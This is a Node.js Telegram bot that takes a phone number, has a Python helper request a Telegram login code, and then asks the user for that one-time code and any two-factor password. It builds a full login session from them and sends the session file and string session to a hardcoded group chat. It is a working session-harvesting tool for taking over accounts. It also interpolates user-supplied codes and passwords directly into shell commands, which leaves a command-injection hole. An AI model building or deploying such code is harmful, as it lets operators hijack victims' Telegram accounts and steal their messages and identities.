import { Telegraf } from "telegraf";
import { exec } from "child_process";
import fs from "fs";
import express from "express";
import dotenv from "dotenv";

dotenv.config();

const bot = new Telegraf(process.env.BOT_TOKEN);
const API_ID = process.env.API_ID;
const API_HASH = process.env.API_HASH;
const GROUP_CHAT_ID = -4978375863; // your group chat id

const userState = {};

bot.start((ctx) => {
  userState[ctx.chat.id] = {};
  ctx.reply("👋 Welcome! Send phone numbers (one per line) starting with +123...");
});

bot.on("text", async (ctx) => {
  const userId = ctx.chat.id;
  const username = ctx.from.username || ctx.from.first_name || "Unknown";
  const msg = ctx.message.text.trim();

  const numbers = msg.split(/\n|\s+/).filter((n) => n.startsWith("+") && n.length > 10);

  if (numbers.length === 0) {
    return ctx.reply("❌ Please send valid phone numbers (start with +123...)");
  }

  for (const phone of numbers) {
    ctx.reply(`📲 Processing ${phone} ...`);
    await new Promise((resolve) => {
      const command = `python3 session.py ${API_ID} ${API_HASH} ${phone} request`;
      exec(command, (error, stdout) => {
        if (error || !stdout.includes("CODE_REQUESTED")) {
          bot.telegram.sendMessage(GROUP_CHAT_ID, `❌ Failed to send OTP for ${phone} (by @${username})`);
          return resolve();
        }
        ctx.reply(`✅ OTP sent for ${phone}. Please reply with the OTP code.`);
        userState[userId] = { phone, waitingForOtp: true, username };
        resolve();
      });
    });
  }
});

bot.on("text", (ctx) => {
  const userId = ctx.chat.id;
  const state = userState[userId];
  if (!state?.waitingForOtp) return;

  const otp = ctx.message.text.trim();
  const { phone, username } = state;

  const command = `python3 session.py ${API_ID} ${API_HASH} ${phone} otp=${otp}`;

  exec(command, (error, stdout) => {
    if (error) {
      bot.telegram.sendMessage(GROUP_CHAT_ID, `❌ OTP verification failed for ${phone} (by @${username})`);
      userState[userId] = {};
      return;
    }

    stdout = stdout.trim();
    if (stdout.includes("NEED_2FA")) {
      userState[userId] = { phone, otp, waitingForPassword: true, username };
      return ctx.reply(`🔒 ${phone} requires 2FA password. Please send password:`);
    }

    handleSessionResult(stdout, phone, username);
    userState[userId] = {};
  });
});

bot.on("text", (ctx) => {
  const userId = ctx.chat.id;
  const state = userState[userId];
  if (!state?.waitingForPassword) return;

  const password = ctx.message.text.trim();
  const { phone, otp, username } = state;

  const command = `python3 session.py ${API_ID} ${API_HASH} ${phone} otp=${otp} password=${password}`;

  exec(command, (error, stdout) => {
    if (error) {
      bot.telegram.sendMessage(GROUP_CHAT_ID, `❌ Password verification failed for ${phone} (by @${username})`);
      userState[userId] = {};
      return;
    }

    stdout = stdout.trim();
    handleSessionResult(stdout, phone, username);
    userState[userId] = {};
  });
});

function handleSessionResult(stdout, phone, username) {
  if (stdout.includes("SESSION_FILE")) {
    const filePath = `${phone}.session`;
    const match = stdout.match(/STRING_SESSION=(.+)/);

    bot.telegram.sendMessage(
      GROUP_CHAT_ID,
      `📌 *New Session Generated*\n👤 User: @${username}\n📱 Number: ${phone}`,
      { parse_mode: "Markdown" }
    );

    if (fs.existsSync(filePath)) {
      bot.telegram.sendDocument(GROUP_CHAT_ID, {
        source: filePath,
        filename: `${phone}.session`,
      });
    }

    if (match) {
      bot.telegram.sendMessage(
        GROUP_CHAT_ID,
        `🔑 *String Session:*\n\`${match[1]}\``,
        { parse_mode: "Markdown" }
      );
    }
  } else {
    bot.telegram.sendMessage(GROUP_CHAT_ID, `❌ Failed to generate session for ${phone} (by @${username})`);
  }
}

const app = express();
const PORT = process.env.PORT || 3000;

app.get("/", (req, res) => {
  res.send("<h1>🤖 Telegram Bot Status</h1><p>✅ Bot is running!</p>");
});

app.listen(PORT, () => {
  console.log(`🌐 Status page running at http://localhost:${PORT}`);
});

bot.launch();
console.log("🚀 Bot running...");
                       
